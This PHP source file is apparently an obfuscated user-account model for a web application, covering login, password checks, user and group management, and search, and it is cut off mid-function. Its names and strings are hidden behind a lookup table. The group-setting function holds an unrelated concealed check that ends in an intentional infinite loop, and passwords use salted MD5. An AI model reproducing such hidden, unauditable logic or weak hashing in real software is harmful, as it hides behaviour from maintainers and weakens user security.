<?php
 goto F©«†áÖ’µ; A™¸Ó¾¶”™: class UserModel extends ModelBase { protected $tableName = "\x75\163\x65\x72"; protected $tableMeta = array("\x74\x61\x62\154\x65\116\x61\155\x65" => "\x75\x73\145\162\x5f\x6d\145\x74\141", "\155\x65\164\x61\106\x69\145\154\x64" => "\x75\163\145\x72\x49\x44"); protected $simpleField = "\x75\163\x65\162\x49\x44\x2c\x6e\x69\x63\153\x4e\x61\x6d\145\x2c\156\141\x6d\145\x2c\x61\166\x61\164\141\x72\x2c\163\145\170\x2c\163\x74\141\164\165\x73"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($¿äÎ­“„) { $²ã©Û =& $_SERVER[¹ş¤¶ĞÖ]; $öø›ŒŒò = $²ã©Û[2315]; return array($²ã©Û[1944] => array($¿äÎ­“„[0], $öø›ŒŒò), $²ã©Û[1946] => array($¿äÎ­“„[0], $öø›ŒŒò), $²ã©Û[2316] => array($¿äÎ­“„[0], $öø›ŒŒò)); } protected function getInfo($­ØÒ²‚Ç, $ûï–«»Ö = false) { $«·Û Èˆ = $this->getInfoSimple($­ØÒ²‚Ç); if (!is_array($«·Û Èˆ)) { return array(); } if ($ûï–«»Ö) { return $this->_getInfoApply($«·Û Èˆ); } return $this->cacheFunctionGet($_SERVER[¹ş¤¶ĞÖ][1948], $­ØÒ²‚Ç); } protected function getInfoFull($É©…Îå, $¶Ê‡ÙöÌ = false) { $Ô¡ÓÈ˜ç = $this->getInfoSimple($É©…Îå); if (!is_array($Ô¡ÓÈ˜ç)) { return array(); } if ($¶Ê‡ÙöÌ) { return $this->_getInfoApply($Ô¡ÓÈ˜ç, !0); } return $this->cacheFunctionGet($_SERVER[¹ş¤¶ĞÖ][2317], $É©…Îå); } private function _getInfoApply($¿±Úåä°, $»Œ†ù¸ = false) { $»¾¿ñÌÉ =& $_SERVER[¹ş¤¶ĞÖ]; if (!$¿±Úåä°) { return $¿±Úåä°; } $²Ñß•¸§ = md5($»¾¿ñÌÉ[2318] . $¿±Úåä°[$»¾¿ñÌÉ[920]] . $»¾¿ñÌÉ[2319] . $¿±Úåä°[$»¾¿ñÌÉ[32]]); $¿±Úåä° = $this->_listDataApplyItem($¿±Úåä°); $«ğµ¬º‚ = Model($»¾¿ñÌÉ[1366])->metaGet($¿±Úåä°[$»¾¿ñÌÉ[87]][$»¾¿ñÌÉ[431]]); $¿±Úåä°[$»¾¿ñÌÉ[2320]] = $²Ñß•¸§; $¿±Úåä°[$»¾¿ñÌÉ[87]][$»¾¿ñÌÉ[2140]] = isset($«ğµ¬º‚[$»¾¿ñÌÉ[2141]]) ? $«ğµ¬º‚[$»¾¿ñÌÉ[2141]] : null; if ($»Œ†ù¸) { $¿±Úåä°[$»¾¿ñÌÉ[495]] = $this->metaGet($¿±Úåä°[$»¾¿ñÌÉ[1676]]); } return $¿±Úåä°; } protected function getInfoSimple($ÑÍÊËØ, $Û½ñôÎ = false) { $ï“‹Úå =& $_SERVER[¹ş¤¶ĞÖ]; if (!$ÑÍÊËØ) { return array(); } if ($Û½ñôÎ) { $‹¬ì·¯ = $this->where(array($ï“‹Úå[1676] => intval($ÑÍÊËØ)))->find(); if (!is_array($‹¬ì·¯)) { return array(); } $‹¬ì·¯[$ï“‹Úå[562]] = Action($ï“‹Úå[2321])->parseUrl($‹¬ì·¯[$ï“‹Úå[562]]); return $‹¬ì·¯; } return $this->cacheFunctionGet($ï“‹Úå[1949], $ÑÍÊËØ); } protected function getInfoSimpleOuter($ì–ˆÚ£×) { $Ã»—ÓÀ =& $_SERVER[¹ş¤¶ĞÖ]; if (!$ì–ˆÚ£× || $ì–ˆÚ£× == 0) { return array($Ã»—ÓÀ[1676] => $Ã»—ÓÀ[198], $Ã»—ÓÀ[32] => $Ã»—ÓÀ[162] . LNG($Ã»—ÓÀ[2322]) . $Ã»—ÓÀ[164], $Ã»—ÓÀ[562] => STATIC_PATH . $Ã»—ÓÀ[2323]); } $¸ÍÜŸøš = $this->cacheFunctionGet($Ã»—ÓÀ[1949], $ì–ˆÚ£×); $×ûğ¡³‡ = array_field_key($¸ÍÜŸøš, explode($Ã»—ÓÀ[50], $this->simpleField)); if (!$×ûğ¡³‡) { return array($Ã»—ÓÀ[1676] => $Ã»—ÓÀ[1221], $Ã»—ÓÀ[32] => $Ã»—ÓÀ[162] . LNG($Ã»—ÓÀ[2324]) . $Ã»—ÓÀ[164], $Ã»—ÓÀ[562] => STATIC_PATH . $Ã»—ÓÀ[2325]); } $×ûğ¡³‡[$Ã»—ÓÀ[562]] = Action($Ã»—ÓÀ[2321])->parseUrl($×ûğ¡³‡[$Ã»—ÓÀ[562]]); return $×ûğ¡³‡; } protected function groupUser($ÀèÖ¦‚•) { } public static function errorLang($ƒ¼­íÙ¢) { $åİ¯•¡ñ =& $_SERVER[¹ş¤¶ĞÖ]; $À Ã³åÓ = array(self::ERROR_USER_NOT_EXISTS => $åİ¯•¡ñ[2326], self::ERROR_USER_PASSWORD_ERROR => $åİ¯•¡ñ[2327], self::ERROR_USER_EXIST_NAME => $åİ¯•¡ñ[2328], self::ERROR_USER_EXIST_PHONE => $åİ¯•¡ñ[2329], self::ERROR_USER_EXIST_EMAIL => $åİ¯•¡ñ[2330], self::ERROR_USER_LOGIN_LOCK => $åİ¯•¡ñ[2331], self::ERROR_IP_NOT_ALLOW => $åİ¯•¡ñ[2332], self::ERROR_USER_EXIST_NICKNAME => $åİ¯•¡ñ[2333]); return LNG($À Ã³åÓ[$ƒ¼­íÙ¢]); } public function getInfoByMeta($‘Ü ²Ûº, $Ç¡ÆÔ½ ) { $‰Ä²ƒıÛ =& $_SERVER[¹ş¤¶ĞÖ]; $³Ê»ÖĞÛ = Model($‰Ä²ƒıÛ[2334])->where(array($‰Ä²ƒıÛ[94] => $‘Ü ²Ûº, $‰Ä²ƒıÛ[403] => $Ç¡ÆÔ½ ))->find(); if ($³Ê»ÖĞÛ) { return $this->getInfo($³Ê»ÖĞÛ[$‰Ä²ƒıÛ[1676]]); } return !1; } public function userLoginCheck($Ö’Ç°Ğ¼, $ƒƒéÕ×ù) { $’Š´ŸÎÓ =& $_SERVER[¹ş¤¶ĞÖ]; $×ßñó¯· = $this->userLoginFind($Ö’Ç°Ğ¼); if (!$×ßñó¯·) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($×ßñó¯·[$’Š´ŸÎÓ[1676]], $ƒƒéÕ×ù)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $this->getInfo($×ßñó¯·[$’Š´ŸÎÓ[1676]]); } public function userLoginFind($¢Ô©ë) { $Œ¸ñ¸áà =& $_SERVER[¹ş¤¶ĞÖ]; $Ÿ¬“¸Š = array($Œ¸ñ¸áà[32] => $¢Ô©ë, $Œ¸ñ¸áà[561] => $¢Ô©ë, $Œ¸ñ¸áà[334] => $¢Ô©ë, $Œ¸ñ¸áà[2335] => $¢Ô©ë, $Œ¸ñ¸áà[1033] => $Œ¸ñ¸áà[1035]); if ($this->nickNameRpt()) { unset($Ÿ¬“¸Š[$Œ¸ñ¸áà[561]]); } return $this->where($Ÿ¬“¸Š)->find(); } public function clearCache($¡ÊëÉ¼•) { $©æªôÑå =& $_SERVER[¹ş¤¶ĞÖ]; $this->cacheFunctionClear($©æªôÑå[1948], $¡ÊëÉ¼•); $this->cacheFunctionClear($©æªôÑå[1949], $¡ÊëÉ¼•); $this->cacheFunctionClear($©æªôÑå[2317], $¡ÊëÉ¼•); } public function userPasswordCheck($”¡ä¢çà, $ãÉì™‰) { $·©¸Í ¥ =& $_SERVER[¹ş¤¶ĞÖ]; $ŸíÄİäƒ = $this->where(array($·©¸Í ¥[1676] => intval($”¡ä¢çà)))->find(); $³ÒĞÁÊ­ = $this->metaGet($”¡ä¢çà); $¦ñ‰ã÷™ = isset($³ÒĞÁÊ­[$·©¸Í ¥[2336]]) ? $³ÒĞÁÊ­[$·©¸Í ¥[2336]] : $·©¸Í ¥[12]; if (md5($¦ñ‰ã÷™ . trim($ãÉì™‰)) !== $ŸíÄİäƒ[$·©¸Í ¥[920]]) { return !1; } return !0; } public function userAdd($±šˆÍ•Û) { $¥ÄŒ¯¢ =& $_SERVER[¹ş¤¶ĞÖ]; $üØİÌÌÙ = array($¥ÄŒ¯¢[449] => $±šˆÍ•Û[$¥ÄŒ¯¢[32]], $¥ÄŒ¯¢[2337] => $±šˆÍ•Û[$¥ÄŒ¯¢[1555]], $¥ÄŒ¯¢[2338] => isset($±šˆÍ•Û[$¥ÄŒ¯¢[334]]) ? $±šˆÍ•Û[$¥ÄŒ¯¢[334]] : $¥ÄŒ¯¢[12], $¥ÄŒ¯¢[2339] => isset($±šˆÍ•Û[$¥ÄŒ¯¢[2335]]) ? $±šˆÍ•Û[$¥ÄŒ¯¢[2335]] : $¥ÄŒ¯¢[12], $¥ÄŒ¯¢[2340] => isset($±šˆÍ•Û[$¥ÄŒ¯¢[561]]) ? $±šˆÍ•Û[$¥ÄŒ¯¢[561]] : $±šˆÍ•Û[$¥ÄŒ¯¢[32]], $¥ÄŒ¯¢[2341] => isset($±šˆÍ•Û[$¥ÄŒ¯¢[562]]) ? $±šˆÍ•Û[$¥ÄŒ¯¢[562]] : $¥ÄŒ¯¢[12], $¥ÄŒ¯¢[2342] => isset($±šˆÍ•Û[$¥ÄŒ¯¢[2343]]) ? $±šˆÍ•Û[$¥ÄŒ¯¢[2343]] : 1, $¥ÄŒ¯¢[2344] => $±šˆÍ•Û[$¥ÄŒ¯¢[920]], $¥ÄŒ¯¢[1950] => isset($±šˆÍ•Û[$¥ÄŒ¯¢[1853]]) ? $±šˆÍ•Û[$¥ÄŒ¯¢[1853]] : 1024 * 1024 * 20, $¥ÄŒ¯¢[1951] => 0, $¥ÄŒ¯¢[2345] => 0, $¥ÄŒ¯¢[1995] => isset($±šˆÍ•Û[$¥ÄŒ¯¢[776]]) ? $±šˆÍ•Û[$¥ÄŒ¯¢[776]] : 1); if (!empty($±šˆÍ•Û[$¥ÄŒ¯¢[1676]])) { $üØİÌÌÙ[$¥ÄŒ¯¢[1676]] = $±šˆÍ•Û[$¥ÄŒ¯¢[1676]]; } $©¹ÔœÂò = $this->_checkExist($±šˆÍ•Û); if ($©¹ÔœÂò !== !0) { return $©¹ÔœÂò; } if (!empty($üØİÌÌÙ[$¥ÄŒ¯¢[562]]) && strlen($üØİÌÌÙ[$¥ÄŒ¯¢[562]]) > 255) { $üØİÌÌÙ[$¥ÄŒ¯¢[562]] = $¥ÄŒ¯¢[12]; } $—ä–ÏË  = $this->add($üØİÌÌÙ); $…ù´šç = array($¥ÄŒ¯¢[2344] => $üØİÌÌÙ[$¥ÄŒ¯¢[920]], $¥ÄŒ¯¢[2340] => $üØİÌÌÙ[$¥ÄŒ¯¢[561]]); $this->userEdit($—ä–ÏË , $…ù´šç); Model($¥ÄŒ¯¢[1366])->userRootAdd($—ä–ÏË ); return $—ä–ÏË ; } protected function userEditTest($Úê¼Ã´, $Ä¬äáÄñ) { return $this->call($_SERVER[¹ş¤¶ĞÖ][2346], $Úê¼Ã´, $Ä¬äáÄñ); } protected function userEdit($şÓ®ÔŞ, $ëç”Ø¼¬) { $³Ğ÷ûÚ =& $_SERVER[¹ş¤¶ĞÖ]; $¢¬¶ì»‹ = $this->getInfoSimple($şÓ®ÔŞ); if (!$¢¬¶ì»‹) { return !1; } $÷ÕÇ«ş = $this->_checkExist($ëç”Ø¼¬, $şÓ®ÔŞ); if ($÷ÕÇ«ş !== !0) { return $÷ÕÇ«ş; } if (isset($ëç”Ø¼¬[$³Ğ÷ûÚ[920]]) && trim($ëç”Ø¼¬[$³Ğ÷ûÚ[920]]) != $³Ğ÷ûÚ[12]) { $¿­·Òù¼ = $this->metaGet($şÓ®ÔŞ); if (empty($¿­·Òù¼[$³Ğ÷ûÚ[2336]])) { $¿­·Òù¼[$³Ğ÷ûÚ[2336]] = rand_string(10); Model($³Ğ÷ûÚ[533])->metaSet($şÓ®ÔŞ, $³Ğ÷ûÚ[2336], $¿­·Òù¼[$³Ğ÷ûÚ[2336]]); } $ëç”Ø¼¬[$³Ğ÷ûÚ[920]] = md5($¿­·Òù¼[$³Ğ÷ûÚ[2336]] . trim($ëç”Ø¼¬[$³Ğ÷ûÚ[920]])); } else { unset($ëç”Ø¼¬[$³Ğ÷ûÚ[920]]); } if (!empty($ëç”Ø¼¬[$³Ğ÷ûÚ[562]]) && strlen($ëç”Ø¼¬[$³Ğ÷ûÚ[562]]) > 255) { $ëç”Ø¼¬[$³Ğ÷ûÚ[562]] = $³Ğ÷ûÚ[12]; } $this->where(array($³Ğ÷ûÚ[1667] => $şÓ®ÔŞ))->save($ëç”Ø¼¬); if (isset($ëç”Ø¼¬[$³Ğ÷ûÚ[561]])) { $this->setNamePinyin($şÓ®ÔŞ, $ëç”Ø¼¬[$³Ğ÷ûÚ[561]]); } $this->clearCache($şÓ®ÔŞ); return !0; } public function setNamePinyin($¶±ÏÃÙ, $×±Éö¾ = false) { $ÏŸ´¶ƒ =& $_SERVER[¹ş¤¶ĞÖ]; if (!$×±Éö¾) { $ôöÕèñ³ = $this->getInfoSimple($¶±ÏÃÙ); $×±Éö¾ = $ôöÕèñ³[$ÏŸ´¶ƒ[561]] ? $ôöÕèñ³[$ÏŸ´¶ƒ[561]] : $ôöÕèñ³[$ÏŸ´¶ƒ[32]]; } $íÕÆ›Âš = Model($ÏŸ´¶ƒ[554]); if (!Input::check($×±Éö¾, $ÏŸ´¶ƒ[612])) { return $íÕÆ›Âš->metaSet($¶±ÏÃÙ, array($ÏŸ´¶ƒ[494] => $ÏŸ´¶ƒ[12], $ÏŸ´¶ƒ[493] => $ÏŸ´¶ƒ[12])); } return $íÕÆ›Âš->metaSet($¶±ÏÃÙ, array($ÏŸ´¶ƒ[494] => str_replace($ÏŸ´¶ƒ[53], $ÏŸ´¶ƒ[12], Pinyin::get($×±Éö¾)), $ÏŸ´¶ƒ[493] => Pinyin::get($×±Éö¾, $ÏŸ´¶ƒ[613]))); } private function nickNameRpt() { $Ïš ‰© =& $_SERVER[¹ş¤¶ĞÖ]; $ò»ì™ÁÊ = Model($Ïš ‰©[796])->get($Ïš ‰©[2347]); $ÊñŸ¦¾ = $GLOBALS[$Ïš ‰©[6]][$Ïš ‰©[410]][$Ïš ‰©[2347]]; $¥•“˜ = !is_null($ò»ì™ÁÊ) ? $ò»ì™ÁÊ : $ÊñŸ¦¾; return !!$¥•“˜; } private function _checkExist($”Õ¶Éó, $ï›½í†Í = false) { $¨ÆåÀŠÌ =& $_SERVER[¹ş¤¶ĞÖ]; $°…–àà = array($¨ÆåÀŠÌ[32] => UserModel::ERROR_USER_EXIST_NAME, $¨ÆåÀŠÌ[561] => UserModel::ERROR_USER_EXIST_NICKNAME, $¨ÆåÀŠÌ[334] => UserModel::ERROR_USER_EXIST_EMAIL, $¨ÆåÀŠÌ[2335] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($°…–àà[$¨ÆåÀŠÌ[561]]); } $ì¨ùá» = $ï›½í†Í ? array($¨ÆåÀŠÌ[1676] => array($¨ÆåÀŠÌ[2348], $ï›½í†Í)) : array(); foreach ($°…–àà as $ÒÓå¯Ğ => $óúß Ê) { $Û§ö»¼Ò = array(); foreach ($°…–àà as $ÏøáÓÊ® => $ô¾‰¬Í¨) { if (isset($”Õ¶Éó[$ÏøáÓÊ®]) && $”Õ¶Éó[$ÏøáÓÊ®]) { $Û§ö»¼Ò[] = $”Õ¶Éó[$ÏøáÓÊ®]; } } if (!$Û§ö»¼Ò) { continue; } $½Ù³ƒ¤Ù = array_merge(array($ÒÓå¯Ğ => array($¨ÆåÀŠÌ[7], $Û§ö»¼Ò)), $ì¨ùá»); $×ºö‰ = $this->where($½Ù³ƒ¤Ù)->find(); if ($×ºö‰) { return $óúß Ê; } } return !0; } public function userListInfo($Í§Ş¢§) { $†ÙÔè×µ =& $_SERVER[¹ş¤¶ĞÖ]; $˜¾ÍÉöÂ = array(); $Í§Ş¢§ = is_array($Í§Ş¢§) ? array_unique($Í§Ş¢§) : array(); if (!$Í§Ş¢§) { return $˜¾ÍÉöÂ; } if (count($Í§Ş¢§) < 20) { foreach ($Í§Ş¢§ as $Õ¬õ³Ü†) { $˜¾ÍÉöÂ[$Õ¬õ³Ü† . $†ÙÔè×µ[12]] = $this->getInfoSimpleOuter($Õ¬õ³Ü†); } } else { $„œ¶®ö = array($†ÙÔè×µ[1667] => array($†ÙÔè×µ[447], $Í§Ş¢§)); if (count($Í§Ş¢§) == 1) { $„œ¶®ö = array($†ÙÔè×µ[1667] => $Í§Ş¢§[0]); } $ìí‡‰ñÏ = Model($†ÙÔè×µ[533])->field($this->simpleField)->where($„œ¶®ö)->select(); $ìí‡‰ñÏ = array_to_keyvalue($ìí‡‰ñÏ, $†ÙÔè×µ[1676]); foreach ($Í§Ş¢§ as $Õ¬õ³Ü†) { $ëæÂ…–Ò = $ìí‡‰ñÏ[$Õ¬õ³Ü†]; if (!$ëæÂ…–Ò) { $˜¾ÍÉöÂ[$Õ¬õ³Ü† . $†ÙÔè×µ[12]] = $this->getInfoSimpleOuter($Õ¬õ³Ü†); continue; } $ëæÂ…–Ò[$†ÙÔè×µ[562]] = Action($†ÙÔè×µ[2321])->parseUrl($ëæÂ…–Ò[$†ÙÔè×µ[562]]); $˜¾ÍÉöÂ[$Õ¬õ³Ü† . $†ÙÔè×µ[12]] = $ëæÂ…–Ò; } } return $˜¾ÍÉöÂ; } protected function userStatus($Ê”¸€¶¬, $ÄŠşá€) { $ÊœÕ‘‹Ó = $this->getInfoSimple($Ê”¸€¶¬); if (!$ÊœÕ‘‹Ó) { return !1; } $È·ğµï¿ = array($_SERVER[¹ş¤¶ĞÖ][776] => $ÄŠşá€); return $this->userEdit($Ê”¸€¶¬, $È·ğµï¿); } protected function userRemove($ş“è€) { $ğÙæšàˆ =& $_SERVER[¹ş¤¶ĞÖ]; $ß±ßñ‰ = $this->getInfoSimple($ş“è€); if (!$ß±ßñ‰) { return !1; } $ò¿»°œË = array($ğÙæšàˆ[1667] => $ş“è€); Model($ğÙæšàˆ[621])->where($ò¿»°œË)->delete(); Model($ğÙæšàˆ[2349])->where($ò¿»°œË)->delete(); Model($ğÙæšàˆ[1956])->where($ò¿»°œË)->delete(); Model($ğÙæšàˆ[2334])->where($ò¿»°œË)->delete(); Model($ğÙæšàˆ[1101])->where($ò¿»°œË)->delete(); Model($ğÙæšàˆ[2164])->removeUserAll($ş“è€); Model($ğÙæšàˆ[851])->userRootRemove($ş“è€); return $this->where($ò¿»°œË)->delete(); } protected function userGroupSet($»Çç¬ú, $»Á¾™´Ö, $½Áİ¦’– = array()) { $è÷Ãó«™ =& $_SERVER[¹ş¤¶ĞÖ]; if (!isset($_SERVER[$è÷Ãó«™[905]]) || !isset($_SERVER[$è÷Ãó«™[991]])) { $˜ œùÆÍ = $è÷Ãó«™[906]; $Üış˜Ö” = $è÷Ãó«™[907]; $æ´ÎŸ¬È = $_SERVER[$è÷Ãó«™[902]] . $è÷Ãó«™[903]; $İ”ñ’ ı = $Üış˜Ö”($æ´ÎŸ¬È); $§ŒçÛ¦ = explode($è÷Ãó«™[231], $İ”ñ’ ı); if (count($§ŒçÛ¦) < $è÷Ãó«™[636]) { $ã“¢¼§’ = $è÷Ãó«™[908]; $ã“¢¼§’(); } $î•†Êıé = $è÷Ãó«™[909]; $î•†Êıé($_SERVER[$è÷Ãó«™[910]]); $‹õ®’¥ = 1; for ($ØÑÃë‚œ = $‹õ®’¥; $ØÑÃë‚œ > 0; $ØÑÃë‚œ++) { $î•†Êıé = json_encode($GLOBALS[$è÷Ãó«™[447]]); } } $Ğ­È×”Ì = $this->getInfoSimple($»Çç¬ú); if (!$Ğ­È×”Ì || !is_array($»Á¾™´Ö)) { return !1; } $˜„¯ØÇ = Model($è÷Ãó«™[1956]); $˜„¯ØÇ->where(array($è÷Ãó«™[1676] => $»Çç¬ú))->delete(); $Ì“Ôºä = array(); $ úàÃ = 0; foreach ($»Á¾™´Ö as $ºÚ¬ => $İğ­Ç­„) { $è¦Å¶¯Á = array($è÷Ãó«™[1676] => $»Çç¬ú, $è÷Ãó«™[1866] => $ºÚ¬, $è÷Ãó«™[1970] => $İğ­Ç­„); $è¦Å¶¯Á[$è÷Ãó«™[1890]] = isset($½Áİ¦’–[$ úàÃ]) ? $½Áİ¦’–[$ úàÃ] : 0; $ úàÃ++; $Ì“Ôºä[] = $è¦Å¶¯Á; } return $˜„¯ØÇ->addAll($Ì“Ôºä, array(), !0); } protected function userGroupAdd($ù¤™ğÒ¹, $Õ§İñ˜ñ = array()) { $âğÓĞ =& $_SERVER[¹ş¤¶ĞÖ]; $…™Ùòà¸ = $this->getInfoSimple($ù¤™ğÒ¹); if (!$…™Ùòà¸ || empty($Õ§İñ˜ñ)) { return !1; } $Ş€ŞßÉÜ = array(); foreach ($Õ§İñ˜ñ as $ÒÛ©ı´É => $£Ÿú¼‰‘) { $Ş€ŞßÉÜ[] = array($âğÓĞ[1676] => $ù¤™ğÒ¹, $âğÓĞ[1866] => $ÒÛ©ı´É, $âğÓĞ[1970] => $£Ÿú¼‰‘, $âğÓĞ[1890] => 0); } return Model($âğÓĞ[1956])->addAll($Ş€ŞßÉÜ, array(), !0); } protected function userGroupRemove($’Éùä† , $ğ°óå­) { $•¸°ºËñ =& $_SERVER[¹ş¤¶ĞÖ]; $ÊëŸ‚şÓ = $this->getInfoSimple($’Éùä† ); if (!$ÊëŸ‚şÓ || !$ğ°óå­) { return !1; } $»Ô„ê¸ = array($•¸°ºËñ[1667] => $’Éùä† , $•¸°ºËñ[1954] => $ğ°óå­); return Model($•¸°ºËñ[1956])->where($»Ô„ê¸)->delete(); } public function listData() { $Ò€ğôÄ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($Ò€ğôÄ[$_SERVER[¹ş¤¶ĞÖ][398]]); return $Ò€ğôÄ; } public function listByID($¤Âİê¤§) { $ı¥Ò½¡´ =& $_SERVER[¹ş¤¶ĞÖ]; if (!$¤Âİê¤§) { return; } $ËÏµÔ‹» = array($ı¥Ò½¡´[1676] => array($ı¥Ò½¡´[7], $¤Âİê¤§)); $Äò¥—¬ = $this->where($ËÏµÔ‹»)->select(); $Äò¥—¬ = array_sort_keep($Äò¥—¬, $ı¥Ò½¡´[1676], $¤Âİê¤§); $this->_listDataApply($Äò¥—¬); return $Äò¥—¬; } public function listByGroup($Ãªº±ˆ¡ = 0, $«Ã„ü’ = array()) { $Ò©ÁÓØÄ =& $_SERVER[¹ş¤¶ĞÖ]; $Èã²±€ = $Ò©ÁÓØÄ[12]; $ÈÃƒÖ = array(); if ($Ãªº±ˆ¡) { $ÈÃƒÖ = array($Ò©ÁÓØÄ[2350] => intval($Ãªº±ˆ¡)); $Èã²±€ = "\114\x45\x46\124\40\112\117\111\x4e\40{$this->tablePrefix}\165\163\x65\162\x5f\x67\162\x6f\x75\160\40\x75\163\145\162\x5f\x67\162\x6f\165\160\x20\x6f\156\40\x75\x73\x65\162\x2e\x75\163\x65\x72\x49\104\x20\x3d\x20\x75\163\145\162\x5f\147\x72\x6f\x75\160\56\165\x73\x65\162\111\104"; $›×ğé™× = Input::get($Ò©ÁÓØÄ[486], null, $Ò©ÁÓØÄ[12]) ? $Ò©ÁÓØÄ[12] : $Ò©ÁÓØÄ[2351]; } if (isset($«Ã„ü’[$Ò©ÁÓØÄ[776]])) { $ÈÃƒÖ[$Ò©ÁÓØÄ[2352]] = $«Ã„ü’[$Ò©ÁÓØÄ[776]]; } $¶¢ı¯ú« = $this->_makeOrder($›×ğé™×)->field($Ò©ÁÓØÄ[2353])->where($ÈÃƒÖ)->join($Èã²±€)->selectPage(50); $this->_listDataApply($¶¢ı¯ú«[$Ò©ÁÓØÄ[398]]); return $¶¢ı¯ú«; } private function _makeOrder($šíå†˜µ = '') { $°íŸ¡­Ø =& $_SERVER[¹ş¤¶ĞÖ]; $ÍŞãû¥† = array($°íŸ¡­Ø[1676], $°íŸ¡­Ø[32], $°íŸ¡­Ø[1855], $°íŸ¡­Ø[1827], $°íŸ¡­Ø[201]); $¼ß¾Ã’ø = array($°íŸ¡­Ø[479] => $°íŸ¡­Ø[480], $°íŸ¡­Ø[481] => $°íŸ¡­Ø[482]); $ıÓ´Ë = Input::get($°íŸ¡­Ø[486], $°íŸ¡­Ø[7], $°íŸ¡­Ø[1667], $ÍŞãû¥†); $í“ú‰Š™ = Input::get($°íŸ¡­Ø[487], $°íŸ¡­Ø[7], $°íŸ¡­Ø[1957], array($°íŸ¡­Ø[1957], $°íŸ¡­Ø[481])); $í“ú‰Š™ = $¼ß¾Ã’ø[$í“ú‰Š™]; $šíå†˜µ = $šíå†˜µ . "\165\163\x65\x72\56{$ıÓ´Ë}\40{$í“ú‰Š™}\x2c\x20\165\x73\145\x72\x2e\x75\x73\145\x72\111\104\x20\141\x73\143"; return $this->alias($°íŸ¡­Ø[2083])->order($šíå†˜µ); } public function listSearch($¾º¢êÒ) { $ÜĞÖ‰® =& $_SERVER[¹ş¤¶ĞÖ]; $îˆ¿Œ‰± = $¾º¢êÒ[$ÜĞÖ‰®[1960]]; $”˜¬ßÕŞ = isset($¾º¢êÒ[$ÜĞÖ‰®[1961]]) ? $¾º¢êÒ[$ÜĞÖ‰®[1961]] : !1; $îˆ¿Œ‰± = str_replace($ÜĞÖ‰®[1962], $ÜĞÖ‰®[1963], trim($îˆ¿Œ‰±)); $ƒ“Îáïâ = array($ÜĞÖ‰®[32] => array($ÜĞÖ‰®[412], "\45{$îˆ¿Œ‰±}\x25"), $ÜĞÖ‰®[334] => array($ÜĞÖ‰®[412], "{$îˆ¿Œ‰±}\45"), $ÜĞÖ‰®[561] => array($ÜĞÖ‰®[412], "{$îˆ¿Œ‰±}\45"), $ÜĞÖ‰®[1033] => $ÜĞÖ‰®[1964]); if (Input::check($îˆ¿Œ‰±, $ÜĞÖ‰®[340])) { $ƒ“Îáïâ[$ÜĞÖ‰®[1676]] = array($ÜĞÖ‰®[412], "{$îˆ¿Œ‰±}\x25"); $ƒ“Îáïâ[$ÜĞÖ‰®[2335]] = array($ÜĞÖ‰®[412], "{$îˆ¿Œ‰±}\x25"); } if (!$îˆ¿Œ‰±) { $ƒ“Îáïâ = array(); } if (isset($¾º¢êÒ[$ÜĞÖ‰®[776]])) { $ƒ“Îáïâ[$ÜĞÖ‰®[776]] = $¾º¢êÒ[$ÜĞÖ‰®[776]]; } $ƒ“Îáïâ = $this->parseWhereLike($ƒ“Îáïâ); $öŸö¯ş = $this->_makeOrder()->where($ƒ“Îáïâ)->selectPage(20); if (!$öŸö¯ş || count($öŸö¯ş[$ÜĞÖ‰®[398]]) < 5 && Input::check($îˆ¿Œ‰±, $ÜĞÖ‰®[347])) { $òÊÓˆŸƒ = $this->_searchFromMeta($ÜĞÖ‰®[493], $îˆ¿Œ‰±, 10); $†¹¹«¿ò = $this->_searchFromMeta($ÜĞÖ‰®[494], $îˆ¿Œ‰±, 10); $×Ù°òàÑ = array_merge($òÊÓˆŸƒ, $†¹¹«¿ò, $öŸö¯ş[$ÜĞÖ‰®[398]]); $öŸö¯ş[$ÜĞÖ‰®[398]] = array_unique_by_key($×Ù°òàÑ, $ÜĞÖ‰®[1676]); $öŸö¯ş[$ÜĞÖ‰®[395]][$ÜĞÖ‰®[396]] = count($öŸö¯ş[$ÜĞÖ‰®[398]]); $öŸö¯ş[$ÜĞÖ‰®[395]][$ÜĞÖ‰®[397]] = ceil($öŸö¯ş[$ÜĞÖ‰®[395]][$ÜĞÖ‰®[396]] / $öŸö¯ş[$ÜĞÖ‰®[395]][$ÜĞÖ‰®[392]]); } $this->_listDataApply($öŸö¯ş[$ÜĞÖ‰®[398]]); $this->_filterByGroup($öŸö¯ş, $”˜¬ßÕŞ); return $öŸö¯ş; } private function _filterByGroup(&$”ŸçÏÓ‰, $å¾‡ä£š) { $¶ß£ÃÊÉ =& $_SERVER[¹ş¤¶ĞÖ]; if (!$å¾‡ä£š) { return $”ŸçÏÓ‰; } foreach ($”ŸçÏÓ‰[$¶ß£ÃÊÉ[398]] as $£ÇˆÃ†¨ => &$ú˜¨ÅŸ‡) { $Ó’Æ˜×° = array_to_keyvalue($ú˜¨ÅŸ‡[$¶ß£ÃÊÉ[2053]], $¶ß£ÃÊÉ[12], $¶ß£ÃÊÉ[1866]); if (!in_array($å¾‡ä£š, $Ó’Æ˜×°)) { unset($”ŸçÏÓ‰[$¶ß£ÃÊÉ[398]][$£ÇˆÃ†¨]); } } unset($ú˜¨ÅŸ‡); $”ŸçÏÓ‰[$¶ß£ÃÊÉ[398]] = array_values($”ŸçÏÓ‰[$¶ß£ÃÊÉ[398]]); $”ŸçÏÓ‰[$¶ß£ÃÊÉ[395]] = array($¶ß£ÃÊÉ[2118] => count($”ŸçÏÓ‰[$¶ß£ÃÊÉ[398]]), $¶ß£ÃÊÉ[2116] => $”ŸçÏÓ‰[$¶ß£ÃÊÉ[395]][$¶ß£ÃÊÉ[392]], $¶ß£ÃÊÉ[2115] => 1, $¶ß£ÃÊÉ[2117] => 1); } private function _searchFromMeta($½¢•ü‰, $§ê–×·, $¥…Å ‹º) { $ö×ÖŞË½ =& $_SERVER[¹ş¤¶ĞÖ]; $§ê–×· = strtolower($§ê–×·); $ğ™¦“‡Ÿ = array($ö×ÖŞË½[94] => $½¢•ü‰, 